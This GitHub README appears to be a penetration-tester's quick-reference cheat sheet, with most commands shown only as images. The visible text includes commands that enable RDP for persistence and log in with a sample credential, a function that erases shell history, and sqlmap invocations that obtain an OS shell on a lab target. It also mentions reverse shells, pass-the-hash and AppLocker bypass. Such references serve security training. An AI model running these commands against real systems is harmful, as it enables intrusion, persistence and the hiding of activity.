
<h1 align="center">Welcome to the Command-Center!</h1>

<h2 align="center">There are so many tools, commands and switches... it's easy to confuse them! I made this repo so you can quickly search for the right ones when needed.</h2>

<h3 align="center">Let's exit the outside world and enter cyber space. (We have cookies... 😎)</h3>

<img src="images/001_metal-door.jpg">

<p align="justify">The way it works is that you use your browser's search function to quickly find commands for a tool you need. In Firefox for example this is done by using <code>CTRL+F</code></p>

<p align="justify">Let's try it! Let's use the search phrase "hydra". Hit <code>CTRL+F</code> and then type in the search bar <code>hydra</code> you'll see that the first result will be this very line because that's the first occurence for that word but if you use your up and down arrows next to the search bar you can quickly jump to the next occurence where you'll find the most commonly used switches and a little explanation about the program.</p>

<img src="images/002_hydra.png">

<p align="justify">Alternatively you can just browse through these commands using your slider in your browser or your mouse wheel in the middle. Anyways, I hope this repo can serve you well, let me know if you have any comments or suggestions, you can reach me here or on LinkedIn @codetorok thanks for checking out the Command-Center!</p>

* Go here if you are looking for:
* **[TOR Service / Anonymity](https://github.com/codetorok/command-center/blob/master/TOR-SERVICE/tor_service_setup_and_use.md)**
* **[Linux Privilege Escalation (privesc)](https://github.com/codetorok/command-center/blob/master/Linux-Privesc/linux-privesc.md)**
* **[Windows Privilege Escalation (privesc)](https://github.com/codetorok/command-center/blob/master/Windows-Privesc/windows-privesc.md)**
* **[Windows Active Directory](https://github.com/codetorok/command-center/blob/master/Windows_AD/windows-active-directory.md)**
* **[Windows SSH Service Setup](https://github.com/codetorok/command-center/blob/master/Windows-ssh/windows-ssh-setup.md)**
* **[Pivoting in Metasploit](https://github.com/codetorok/command-center/blob/master/pivoting_metasploit/pivoting_metasploit.md)**
* **[Buffer Overflow (Basic)](https://github.com/codetorok/command-center/blob/master/buffer_overflow/buffer_overflow.md)**

<img src="images/003_available_commands.png">

<p align="justify"><code>amass</code> is really good if you need to enumerate subdomains, just make sure you start it at night before going to bed :)</p>

<img src="images/amass_subdomain_enumeration.png">

<p align="justify"><code>binwalk</code> extracts files hidden in pictures, pretty good for stegonograpy.</p>

<img src="images/binwalk_steghide_stegonography.png">

<p align="justify">If you wan't full anonimity (as much as you can get, don't go crazy here) you need to know how to change dns. If you combine this with <code>proxychains</code> using TOR (link to setup: https://github.com/codetorok/command-center/blob/master/TOR-SERVICE/tor_service_setup_and_use.md), you're pretty much good to go as long as you also have WebRTC disabled (link to setup: https://support.avast.com/en-us/article/Prevent-WebRTC-IP-leak/).</p>

<img src="images/change_dns.png">

<p align="justify">These are not commands, I just thought it might come in handy if you need a quick refresher to find a port or ports.</p>

<p>Check your public IP from terminal.</p>

<p>dig +short myip.opendns.com @resolver1.opendns.com</p>


<img src="images/common_ports.png">

<p align="justify">You can do some great things with <code>curl</code>, it's worth going through it's man page, this is one of the great techniques I use quite often.</p>

<img src="images/curl_checking_login_page_form_method.png">

<p align="justify">Directory discovery with dirb when username and password is known.</p>

<img src="images/dirb.png">

<p align="justify">Directory search, dirsearch is great if you have to find directories on a webapp.</p>

<img src="images/dirsearch_directory_enumeration.png">

<p align="justify">This is how you install Docker on Kali for whatever you need, I run my Juice Shop app to test for the OWASP Top10 on Docker.</p>

<img src="images/docker_installing.png">

<p align="justify">Once you installed Juice Shop and want to run it in different ocasions, it's hard to remember that docker command so I made this little shell script, now I only have to type in the name of my script file and I'm runnig the shop.</p>

<img src="images/juice_shop_run.png">

<p align="justify">So let's say you have to crack a password that's from a website that uses just a 4 characters long passphrase. To save up time you can just make a copy of your rockyou.txt or whatever monstrous passlist your using and then filter the copy into a new file that has only the 4 characters long entries (hence this grep one liner) from your rockyou-copy.txt. Copy is needed to not to mess up the original one, you can never be cautious enough ;)</p>

<img src="images/filtering_rockyou_to_4_characters_long_entries_only.png">
  
<p align="justify">SUID or Set-user Identification are files with special root priv permissions. It happens when root doesn't want to make a user root user just in certain cases when user runs some files that requires sudo permissions. Finding these files are imporant as SUID can be abused. SUID starts with a 4 and SGID -which is similar to SUID starts with a 2. The only difference between the two is that when a script or command with SGID (Set-group Identification) permission runs, it runs as if it were a member of the same group in which the file is a member.</p>

<p align="justify">If a lowercase letter “l” appears in the group’s execute field, means that the setgid bit is on, and the execute bit for the group is off or denied.</p>

<img src="images/find_binary_permissions.png">
  
<p align="justify"><code>fping</code> helps you to ping a range of IP addresses.</p>

<img src="images/fping.png">

<p align="justify">Find file in Windows.</p>

<img src="images/how_to_find_a_file_in_windows_terminal.png">

<p>Erase history when using zsh for example from bash, create a function and then call it: </p>

<p>function erase_history { local HISTSIZE=0; }</p>
<p>erase_history</p>

<p>Persistence via RDP

* enabling Remote Desktop via powershell: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
* now we can connect to it from kali: `xfreerdp /u:s.schisholm /p:'FallOutBoy1!' /v:<target IP>`
* to disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"` 
</p>
  
<p align="justify">I wanted to share this one too as at first I couldn't get the binary from the ftp server. First I have to use the command <code>binary</code> and then I can get it like I normally would.</p>

<img src="images/ftp_server_get_binary.png">
  
  <p align="justify">There are different ways you can use <code>gobuster</code> this is the one I use most of the times. The <code>-u</code> is for the host name <code>-w</code> is for the wordlist and <code>-t 40</code> is for the threads so it won't take forever. The <code>tee gobuster-initial</code> is so I can redirect the output to this file and can analyze it later if needed, or just to put it into my pentest report if on an assasment.</p>

<img src="images/gobuster.png">
  
<p align="justify">To simplify things this gpg example is for the symmetric type of encryption, but you can check out the man page and discover a lot more options to encrypt/decrypt.</p>

<img src="images/gpg_symmetric_encrypt_decrypt.png">
  
  <p align="justify">Cracking hashes with <code>hashcat</code> basic synthax. Again this is not a tutorial page, just a quick look up on the different and mostly used switches until you learn it by muscle memory.</p>

<img src="images/hashcat.png">
  
  <p align="justify">How to locate the <code>hashcat.potfile</code> where the cracked hashes are stored.</p>

<img src="images/hashcat_potfile.png">
  
<p align="justify">I mainly created this image for the web login crack part only. Sometimes it's hard to remember how it's done using hydra.</p>

<img src="images/hydra.png">
  
<p align="justify">Cracking some SHA256 hashes with john, using the rockyou.txt as a wordlist, redirecting the output into the johncracked.txt</p>

<img src="images/john.png">
  
<p align="justify">Passing a private key to <code>gpg2john</code> to prep it and then passing the output file to john to crack it :) once it's done you can use the cracked password and the private key to try to log in to the target's system via ssh: <code>ssh -i id_rsa username@IP</code></p>

<img src="images/john2.png">

<p align="justify">Installing Juice Shop to practice the OWASPtop10, great resource! I installed it on a Docker instance, if you need it you can find how to install it on your system just look for it on this page.</p>

<p>Here's the link for reference: https://github.com/bkimminich/juice-shop</p>

<img src="images/juice_shop_installing.png">
  
<p align="justify">Decoding MD5 hashes, just don't forget to use <code>echo</code> with the <code>-n</code> switch.</p>

<img src="images/md5_hash_generate.png">

<p>msfvenom Windows add user</p>

<img src="images/msfvenom_windows_add_user.png">

<p align="justify"><code>msfvenom</code> reverse shell, <code>-p</code> for payload and <code>-f</code> for the format in this case it's raw so I can send the output into a <code>.php</code> file.</p>

<img src="images/msfvenom_reverse_shell_php.png">

<p align="justify">How to connect and display info from <code>mysql</code> database.</p>


<img src="images/mysql.png">

<p align="justify">The most used switches with <code>nmap</code>, also you can use the <code>-A</code> switch to get all the services and their version number at once. If working on a network, not just a single IP, I prefer to know what's what before starting to focus on one machine or the other as it saves up time.</p>

<img src="images/nmap_scans.png">

<p align="justify">This is real life scenario, first I would suggest if you're dropped in an enviroment without anything, check your IP address on the network, then run these scans to identify other machines, their purpose and services, version numbers, open ports etc with nmap.</p>

<img src="images/nmap_scans_real_life.png">

<p align="justify">I include xsltproc one as well in case you want to generate an html report based on your nmap scan file.</p>

<img src="images/nmap_scans_report.png">

<p align="justify">psexec.py from Impacket.</p>

<img src="images/psexec_py.png">

<p align="justify">Pass the hash Windows pth-winexe.</p>

<img src="images/pth_winexe_pass_the_hash.png">

<p align="justify">Public IP address form Linux termnal.</p>
<p>dig +short myip.opendns.com @resolver1.opendns.com</p>
<p>An even shorter comand to get the public IP is: curl ifconfig.me</p>

<p align="justify">Extract the email address from a public key.</p>

<img src="images/public_key_gpg_extract_email.png">

<p align="justify">Python but it can be used in Python3 as well to spawn a terminal.</p>

<img src="images/spawn_terminal_in_python.png">

<p align="justify">Python3 webserver and ftpserver set up commands.</p>

<img src="images/python3_webserver_ftpserver.png">

<p align="justify">Python3 anonymous writable ftp server.</p>

<img src="images/python3_anonymous_ftp_writable.png">

<p align="justify">When I started out I got confused a lot in how to use smbclient and smbmap so I made these screenshots, one is to connect and the second one is to list the available services.</p>

<img src="images/smbclient_conneting_to_share.png">

<p>List services with smbclient.</p>

<img src="images/smbclient_listing_shares.png">

<p>smbclient <code>prompt</code> is to not to ask me for a prompt every time I download something, it is important because in the next command I turn <code>recursive</code> on which will download everything recursiveley (without having to prompt) and the third command is just to get everything from the share we can.</p>

<img src="images/smbclient_prompt_recursive_mget.png">

<p>sqlmap usage</p>

<img src="images/sqlmap.png">

<p>Additionally to sqlmap: capture a login request with Burp and save it in a file ex. login.req, than in sqlmap: sqlmap -r login.req --level 5 --risk 3</p>

<p>Using the session cookies and sqlmap: sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --
cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"</p>

<p>If the target is vulnerable for the get request (see above) we can get a shell out of it: sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --
cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell</p>

<p align="justify">How to add your generated ssh key to your known hosts. It helps with Github also.</p>

<img src="images/ssh_key_add.png">

<p align="justify">SSH port forwarding.</p>

<img src="images/ssh_local_port_fowarding.png">

<p align="justify">Extract a file from a picture with steghide.</p>

<img src="images/steghide.png">

<p align="justify">sublist3r is a subdomain enumeration tool, quite good actually.</p>

<img src="images/sublist3r_subdomain_enumeration.png">

<p align="justify">No big deal, just had to remember how to extract a .tar.gz package at the beginning. Hope this helps you too!</p>

<img src="images/tar_extract.png">

<p align="justify">You can append an IP to your /etc/hosts file but this simple one liner using the command <code>tee</code> is easier than opening it up in nano every time you need it.</p>

<img src="images/tee_append.png">

<p align="justify">Quite good for subdomain enumeration, with theharvester you can even choose your preferred search engine!</p>

<img src="images/theharvester_subdomain_enumeration.png">

<p align="justify">If you're looking for setting up and using TOR services you can find everything here:
https://github.com/codetorok/command-center/blob/master/TOR-SERVICE/tor_service_setup_and_use.md</p>

<p align="justify">Classic! You popped a shell, now it's time to upgrade it and this is how to upgrade reverse shell the proper way so you'll have autocomplete with TAB etc etc... :)</p>

<img src="images/upgrade_shell.png">

<p align="justify">You need this configuration if you want to make Virtualbox work with both type of network connections at the same time: NAT and Bridge</p>

<img src="images/virtualbox_bridge_and_nat_same_time.png">

<p align="justify">wfuzz is built into kali and it's an excellent subdomain enumeration tool.</p>

<img src="images/wfuzz_subdomain_enumeration.png">

<p align="justify">In case you have to bypass AppLocker in Windows.</p>

<img src="images/windows_bypass_applocker.png">

<p align="justify">Windows file transfer, in case you have to bring a file over to the compromised Windows machine. The last piece of information is how do you want to name the file that your bring over.</p>

<img src="images/windows_file_transfer.png">

<p align="justify">Checking Windows PowerShell history of commmands, it's like bash_history in Linux.</p>

<img src="images/windows_powershell_command_history.png">

<p align="justify">Whenever you encounter a juicy WordPress blog wpscan is there for you :) The first pic shows how to enumerate users, the second one takes the user names, saves it in a text file and use it with the wordlist fasttrack.txt against the website's login.</p>

<p>Enumerating users with wpscan:</p>

<img src="images/wpscan_enumerate_users.png">

<p align="justify">Using a wordlist to find vulnerable passwords with wpscan:</p>

<img src="images/wpscan_password_spaying.png">

<p align="justify">How to connect to a remote desktop via xfreedp</p>

<img src="images/xfreerdp_remote_desktop_connect.png">

<p align="justify">Prepping a zip file with zip2john to crack it with john.</p>

<img src="images/zip2john.png">


<p align="justify">This is the end of the list, remember, it's not the commands, it's what you do with those commands and how do you use the information you get out of theses swites, that's all that matters. This repo is for educational purposes only, anything you do with this is on you, so be responsable.</p>

<h2 align="center">The world is at your fingertips 💯</h2>

<img src="images/004_hacker_hoodie.jpg">

**Github, Twitter, LinkedIn:** @codetorok
